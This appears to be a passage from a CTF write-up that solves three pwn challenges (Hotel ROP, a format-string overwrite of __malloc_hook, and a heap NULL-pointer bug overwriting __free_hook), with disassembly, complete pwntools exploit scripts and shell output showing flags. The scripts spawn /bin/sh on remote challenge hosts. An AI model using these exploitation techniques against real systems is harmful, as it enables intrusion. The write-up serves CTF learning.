   0x00000000000011b7 <+50>:    lea    rdi,[rip+0xe7a]        # 0x2038
   0x00000000000011be <+57>:    call   0x1030 <puts@plt>
   0x00000000000011c3 <+62>:    lea    rdi,[rip+0x2ea6]        # 0x4070 <win_land>
   0x00000000000011ca <+69>:    call   0x1040 <system@plt>
   0x00000000000011cf <+74>:    mov    edi,0x0
   0x00000000000011d4 <+79>:    call   0x1080 <exit@plt>
   0x00000000000011d9 <+84>:    nop
   0x00000000000011da <+85>:    leave  
   0x00000000000011db <+86>:    ret    
End of assembler dump.
gef➤  
```

There’s some twist to the loss function, first it expects 2 arguments from the function call then it checks if the sum of 1st and 2nd argument is equals to the 0xdeadc0de if it is, then check if the first argument is equal to the 0x1337c0de once it is, calls the system with the win_land as it’s argument. In order to exploit this, with the gef we find the offset which was 0x28. then we must call californiaand silicon_valley respectively to make the win_land variable equals to /bin/sh then call the loss function.

During the call of the loss function, since we know that it expects the 1st argument to be the 0x1337c0de and the sum of 1st and 2nd should be 0xdeadc0de, we can just find the right value for the second argument by subtracting the 0xdeadc0de from the 0x1337c0de which will be:-

```asm

gef➤  p 0xdeadc0de - 0x1337c0de
$4 = 0xcb760000
gef➤  
```

Now, the exploit will be:-

```py

from pwn import*

p = remote("dctf1-chall-hotel-rop.westeurope.azurecontainer.io", 7480)
elf = ELF("hotel_rop")
p.recvuntil("Welcome to Hotel ROP, on main street ")
elf.address = int(p.recvline().strip(), 16) - 0x136d
print(hex(elf.address))

payload = b"A"*40
payload += p64(elf.symbols['california'])
payload += p64(elf.symbols['silicon_valley'])
payload += p64(elf.address + 0x000000000000140b)
payload += p64(0x1337c0de)
payload += p64(elf.address + 0x0000000000001409)
payload += p64(0xcb760000)*2
payload += p64(elf.symbols['loss'])
p.send(payload)
p.interactive()
```

Running the exploit:-

```asm

❯ python3 hotel_rop.py
[+] Opening connection to dctf1-chall-hotel-rop.westeurope.azurecontainer.io on port 7480: Done
[*] '/home/d4mianwayne/Pwning/CTFs/ductf/hotel_rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
0x564fdcdc6000
[*] Switching to interactive mode
You come here often?
I think you should come here more often.
Welcome to Hotel California
You can sign out anytime you want, but you can never leave
You want to work for Google?
$ id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ cat flag.txt
dctf{ch41n_0f_h0t3ls}$ 
[*] Interrupted
```

### Formats last theorem

This was another format string challenge, performing the checksec on the binary we get the:-

```asm

gef➤  checksec
[+] checksec for '/home/d4mianwayne/Pwning/CTFs/ductf/formats_the_theorem'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
gef➤  
```

We have almost all the protections enabled, since RELRO is Full meaning we won’t be able to overwrite the GOT entries and since the challenge description hint us toward the `__malloc_hook`, we have to go the usual way to overwrite the `__malloc_hook` with the one_gadget address and call the malloc with the help of printf which will eventually call `__malloc_hook` resulting in the one_gadget being executed.

Reference: https://www.jaybosamiya.com/blog/2017/04/06/adv-format-string/ 

Also, since the attachment had the docker container to hint towards LIBC, we can see that the binary was running in the Ubuntu 18.04 container which uses the LIBC 2.27ubuntu1.4 version, there was vuln function, which had format string vulnerabilty:-

```asm

gef➤  disas vuln 
Dump of assembler code for function vuln:
   0x000000000000073a <+0>:    push   rbp
   0x000000000000073b <+1>:    mov    rbp,rsp
   0x000000000000073e <+4>:    sub    rsp,0x70
   0x0000000000000742 <+8>:    mov    rax,QWORD PTR fs:0x28
   0x000000000000074b <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000000074f <+21>:    xor    eax,eax
   0x0000000000000751 <+23>:    lea    rdi,[rip+0x100]        # 0x858
   0x0000000000000758 <+30>:    call   0x5e0 <puts@plt>
   0x000000000000075d <+35>:    lea    rax,[rbp-0x70]
   0x0000000000000761 <+39>:    mov    rsi,rax
   0x0000000000000764 <+42>:    lea    rdi,[rip+0x136]        # 0x8a1
   0x000000000000076b <+49>:    mov    eax,0x0
   0x0000000000000770 <+54>:    call   0x610 <__isoc99_scanf@plt>
   0x0000000000000775 <+59>:    lea    rdi,[rip+0x12b]        # 0x8a7
   0x000000000000077c <+66>:    call   0x5e0 <puts@plt>
   0x0000000000000781 <+71>:    lea    rax,[rbp-0x70]
   0x0000000000000785 <+75>:    mov    rdi,rax
   0x0000000000000788 <+78>:    mov    eax,0x0
   0x000000000000078d <+83>:    call   0x5f0 <printf@plt>
   0x0000000000000792 <+88>:    lea    rdi,[rip+0x11a]        # 0x8b3
   0x0000000000000799 <+95>:    call   0x5e0 <puts@plt>
   0x000000000000079e <+100>:    lea    rdi,[rip+0x10e]        # 0x8b3
   0x00000000000007a5 <+107>:    call   0x5e0 <puts@plt>
   0x00000000000007aa <+112>:    jmp    0x751 <vuln+23>
End of assembler dump.
```

So, in order to exploit this binary, we first needed a LIBC leak to determine the base address of LIBC so that we will be able to determine the __malloc_hook and one_gadget address. Surprisingly, one of the LIBC address at the offset of 2, which I used to get the base address of the LIBC, then using the pwntools fmtstr_payload to write 2 bytes at a time.

```py

from pwn import *

#p = process("./formats_the_theorem")
context.arch = "amd64"
p = remote("dctf-chall-formats-last-theorem.westeurope.azurecontainer.io", 7482)
libc = ELF("libc.so.6")
p.recvline()
p.sendline("%2$p")
p.recvline()
libc.address = int(p.recvline().strip(), 16) - 0x3ed8c0
log.info("LIBC:  0x%x" %(libc.address))
one_gadget = libc.address + 0x4f432
malloc_hook = libc.sym["__malloc_hook"]
target = one_gadget
addr = malloc_hook
count = 0
while target:
    payload = fmtstr_payload(6, {addr: target & 0xffff}, write_size='short')
    p.sendline(payload)
    addr += 2
    target >>= 16

    count += 1
p.sendline("%66000c")
p.interactive()
```
Running the exploit:-

```asm
❯ python3 formats_the_theorem.py
[+] Opening connection to dctf-chall-formats-last-theorem.westeurope.azurecontainer.io on port 7482: Done
[*] '/home/d4mianwayne/Pwning/CTFs/ductf/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] LIBC:  0x7f483a4b2000
[*] Switching to interactive mode

I won't ask you, what your name is. It's getting kinda old at this point
you entered

[..snip..]

I won't ask you, what your name is. It's getting kinda old at this point
you entered

[..snip..]

I won't ask you, what your name is. It's getting kinda old at this point
you entered

[..snip..]

$ id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ cat flag.txt
dctf{N0t_all_7h30r3ms_s0und_g00d}
$ 
[*] Interrupted
```

### Just another heap

This challenge was solved by Faith, later he shared the exploit script for the challenge, he told me:-

> it was a simple bug, malloc returned null but they didnt check for null and just added a controlled value to it(edited)
> [12:51 PM]
> PIE was disabled, so u can make malloc return null with a large size, then add any value to create a pointer to any memory address

Checking the binary with the checksec:-

```asm

gef➤  checksec
[+] checksec for '/home/d4mianwayne/Pwning/CTFs/ductf/just_another_heap'
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
gef➤  
```

The vulnerability existed in the function Create Memory:-

```asm

unsigned __int64 create_memory()
{
  unsigned __int64 v0; // rbx
  const char *name; // rbx
  int important; // [rsp+4h] [rbp-4Ch]
  int recent; // [rsp+8h] [rbp-48h]
  int i; // [rsp+Ch] [rbp-44h]
  size_t size; // [rsp+10h] [rbp-40h] BYREF
  size_t offset; // [rsp+18h] [rbp-38h] BYREF
  unsigned __int64 idx; // [rsp+20h] [rbp-30h] BYREF
  char *chunk; // [rsp+28h] [rbp-28h]
  char is_important[2]; // [rsp+34h] [rbp-1Ch] BYREF
  char is_recent[2]; // [rsp+36h] [rbp-1Ah] BYREF
  unsigned __int64 v12; // [rsp+38h] [rbp-18h]

  v12 = __readfsqword(0x28u);
  if ( dword_6020C0 > 9 )
  {
    puts("You already have to many memories stored in here. You don't want another one.");
  }
  else
  {
    important = 0;
    recent = 0;
    idx = 0LL;
    puts("at what page would you like to write?");
    read_long((__int64)&idx);
    if ( heap_list[idx] || idx > 9 )
    {
      puts("there is already something written at that page.");
    }
    else
    {
      puts("name:");
      v0 = idx;
      struct_list[v0] = malloc(0x20uLL);
      read_data((char *)struct_list[idx], 16);
      name = (const char *)struct_list[idx];
      name[strcspn(name, "\n")] = 0;
      puts("How long is your memory");
      read_long((__int64)&size);
      chunk = (char *)malloc(size);
      puts("Sometimes our memories fade and we only remember parts of them.");
      read_long((__int64)&offset);
      puts("Would you like to leave some space at the beginning in case you remember later?");
      if ( offset <= size )
      {
        if ( chunk )
        {
          for ( i = 0; i < offset; ++i )
            chunk[i] = 95;
        }
        chunk += offset;
        fflush(stdin);
        puts("What would you like to write");
        read_data(chunk, size - offset);
        puts("Would you say this memory is important to you? [Y/N]");
        read_data(is_important, 2);
        if ( is_important[0] == 89 )
          important = 1;
        _IO_getc(stdin);
        puts("Would you say this memory was recent? [Y/N]");
        read_data(is_recent, 2);
        if ( is_recent[0] == 89 )
          recent = 1;
        heap_list[idx] = chunk;
        recent_list[idx] = recent;
        important_list[idx] = important;
        offset_list[idx] = offset;
        size_list[idx] = size;
        ++dword_6020C0;
        puts("Memory created successfully\n");
        puts(byte_401786);
        fflush(stdin);
      }
      else
      {
        puts("Invalid offset");
      }
    }
  }
  return __readfsqword(0x28u) ^ v12;
}
```

The vulnerability was that the program doesn’t check whether the pointer returned by the malloc is valid or not, the program also allow us to enter a, kind of, offset which will be added to the pointer returned by the malloc, since there’s no check for invalid/NULL return value from the malloc, we can exploit this one by giving a large size of the malloc which will return NULL, then we can give the address of the global array which stores the name pointer, what we will exactly do here is explained as follows:-

```py

#!/usr/bin/env python3

from pwn import *

e = ELF("./just_another_heap") 
libc = ELF("./libc.so.6")

#p = process("./just_another_heap", env={"LD_PRELOAD": "./libc.so.6"})
p = remote("dctf-chall-just-another-heap.westeurope.azurecontainer.io", 7481)

def create(idx, name, size, empty, data, important, recent):
    p.sendlineafter("Exit\n", "1")
    p.sendlineafter("\n", str(idx))
    p.sendafter("name:\n", name)
    p.sendlineafter("memory\n", str(size))
    p.sendlineafter("them.\n", str(empty))
    p.sendafter("write\n", data)

    if important:
        p.sendlineafter("\n", "Y")
    else:
        p.sendlineafter("\n", "N")

    if recent:
        p.sendlineafter("\n", "Y")
    else:
        p.sendlineafter("\n", "N")

def forget(idx):
    p.sendlineafter("Exit\n", "3")
    p.sendlineafter("forget?\n", str(idx))

def _list():
    p.sendlineafter("Exit\n", "5")
```

With the wrapper functions, we select the address where the very last name would be stored, which in our case is 0x6022a8

```py

memory_ptr_last_idx = 0x6022a8
puts_got = e.got["puts"]
huge = 0xFFFF0FFFFFFF
```
Then, we firstly create a chunk which will act as a decoy for performing rest of the exploit, we create this chunk, making the 0x6022a8 will point to the BBBBBBBBBBBBBBBB. We will also create a chunk with the name being /bin/sh\x00

```py

create(9, "A"*0xF, 0x10, 0, "B"*0xF, False, False)
create(2, "A"*0xF, 0xa, 0, b"/bin/sh\x00\n", False, False)
```

Now, we will force the malloc to return NULL then make the offset to the pointer of the last chunk[9] which we overwrite with GOT address of the puts, giving us a LIBC leak.

```py

create(0, "A"*0xF, memory_ptr_last_idx + (huge - memory_ptr_last_idx), memory_ptr_last_idx, p64(puts_got) + b"\n", False, False)

_list()

p.recvuntil("9: ")

libc.address = int.from_bytes(p.recvline(), byteorder="little") & 0xFFFFFFFFFFFF - libc.sym["puts"]
system = libc.sym["system"]
free_hook = libc.sym["__free_hook"]

log.info("Libc base @ " + hex(libc.address))
```

Now, doing the same, but this time we will force the malloc to again return the NULL and make the offset value to the address of the __free_hook.

```py

create(1, "A"*0xF, free_hook + (huge - free_hook), free_hook, p64(system) + b"\n", False, False)
```

Now, we just free the chunk 2 which had the /bin/sh string stored resulting in system("/bin/sh"):-

```py

forget(2)

p.interactive()
```

Run the exploit:-

```asm

vagrant@ubuntu-bionic:~/sharedFolder/CTFs/ductf$ python3 just_another_heap.py 
[*] '/home/vagrant/sharedFolder/CTFs/ductf/just_another_heap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/vagrant/sharedFolder/CTFs/ductf/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './just_another_heap': pid 1865
[*] Libc base @ 0x7f83be251000
[*] Switching to interactive mode
$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
$ 
[*] Interrupted
vagrant@ubuntu-bionic:~/sharedFolder/CTFs/ductf$ 
```


